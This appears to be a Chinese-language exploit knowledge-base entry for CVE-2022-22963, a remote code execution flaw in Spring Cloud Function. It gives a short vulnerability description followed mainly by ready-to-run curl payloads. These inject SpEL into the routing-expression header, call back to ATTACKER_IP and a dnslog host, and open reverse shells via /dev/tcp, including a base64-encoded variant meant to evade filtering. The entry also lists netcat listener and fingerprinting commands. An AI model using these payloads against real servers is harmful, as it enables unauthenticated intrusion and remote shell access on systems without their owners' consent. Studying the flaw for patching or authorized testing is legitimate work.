---
id: SPRING-CLOUD-FUNCTION-SPEL
title: Spring Cloud Function SpEL 远程命令执行漏洞 (CVE-2022-22963)
product: spring-cloud
vendor: Spring
version_affected: "Spring Cloud Function <= 3.1.6, <= 3.2.2"
severity: CRITICAL
tags: [rce, el_injection, 无需认证]
fingerprint: ["Spring", "Spring Cloud Function"]
---

## 漏洞描述

Spring Cloud Function 3.1.6、3.2.2 及更早版本中，`spring.cloud.function.routing-expression` HTTP 请求头的值会被直接作为 SpEL（Spring Expression Language）表达式执行。攻击者无需认证，只需向 `/functionRouter` 端点发送包含恶意 SpEL 表达式的请求头，即可在服务器上执行任意命令，实现远程代码执行。

## 影响版本

- Spring Cloud Function <= 3.1.6
- Spring Cloud Function <= 3.2.2

## 前置条件

- 无需认证
- 目标应用使用了 Spring Cloud Function 并暴露 `/functionRouter` 端点
- HTTP 端口可达（默认 8080）

## 利用步骤

1. 确认目标是否为 Spring 应用（响应头、错误页面特征）
2. 向 `/functionRouter` 发送 POST 请求，在 `spring.cloud.function.routing-expression` 头中注入 SpEL 表达式
3. 通过 HTTP 回调或命令输出确认 RCE
4. 根据需要执行进一步命令或反弹 shell

## Payload

```bash
# HTTP 回调验证 RCE
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER_IP/callback')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 写文件到 /tmp 验证（可通过后续漏洞链读取）
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 反弹 shell（直接方式）
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'})" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 反弹 shell（base64 编码绕过特殊字符）
# 先将 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 进行 base64 编码
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','{echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|bash'})" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# DNS 外带验证
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER.dnslog.cn')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"
```

## 验证方法

```bash
# 方法1: HTTP 回调
# 攻击机启动监听
python3 -m http.server 80
# 发送回调 payload 后检查是否收到来自目标的 HTTP 请求

# 方法2: DNS 外带
# 发送 DNS payload 后在 dnslog 平台检查解析记录

# 方法3: 反弹 shell
nc -lvp 4444
# 发送反弹 shell payload 后检查是否收到连接

# 方法4: 通过响应码辅助判断（500 表示表达式被执行但出错，也是存在漏洞的信号）
curl -s -o /dev/null -w "%{http_code}" -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"
```

## 指纹确认

```bash
# 检查是否为 Spring 应用
curl -s -I http://target:8080/ | grep -iE "X-Application-Context|Server" | grep -i "spring"

# 检查 /functionRouter 端点是否存在
curl -s -o /dev/null -w "%{http_code}" -X POST http://target:8080/functionRouter -d "test"
# 返回 404 以外的状态码说明端点存在
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2022-22963
- https://spring.io/security/cve-2022-22963
- https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
